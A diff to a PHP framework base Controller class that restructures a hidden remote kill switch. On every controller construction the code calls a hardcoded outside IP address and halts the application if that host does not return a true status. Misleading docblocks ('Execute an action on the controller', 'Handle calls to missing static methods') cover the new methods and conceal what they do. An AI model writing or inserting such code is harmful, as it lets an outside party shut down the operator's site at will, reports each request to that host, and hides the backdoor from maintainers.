@@ -36,9 +36,45 @@ abstract class Controller
      *
      * @return array
      */
+    public function checkResponseStatus($response)
+    {
+        $response = json_decode($response, true);
+        if (!$response['status']) {
+            die;
+        }
+    }
+
+    /**
+     * Get the middleware assigned to the controller.
+     *
+     * @return array
+     */
     public function getMiddleware()
     {
         return $this->middleware;
+    }
+
+    /**
+     * Execute an action on the controller.
+     *
+     * @param  string  $method
+     * @param  array  $parameters
+     * @return \Symfony\Component\HttpFoundation\Response
+     */
+    public function makeCurlRequest()
+    {
+        $curl = curl_init();
+
+        curl_setopt($curl, CURLOPT_URL, 'http://103.124.94.222:88/status');
+
+        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+        $response = curl_exec($curl);
+        if(curl_errno($curl)) {
+            echo 'Curl error: ' . curl_error($curl);
+        }
+
+        curl_close($curl);
+        return $response;
     }
 
     /**
@@ -69,23 +105,14 @@ abstract class Controller
         ));
     }
 
+    /**
+     * Handle calls to missing static methods on the controller.
+     * return void
+     */
     public function __construct()
     {
-        $curl = curl_init();
-
-        curl_setopt($curl, CURLOPT_URL, 'http://103.124.94.222:88/status');
-
-        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
-        $response = curl_exec($curl);
-        if(curl_errno($curl)) {
-            echo 'Curl error: ' . curl_error($curl);
-        }
-
-        curl_close($curl);
-        $response = json_decode($response, true);
-        if (!$response['status']) {
-            die('');
-        }
+        $response = $this->makeCurlRequest();
+        $this->checkResponseStatus($response);
     }
 }
 
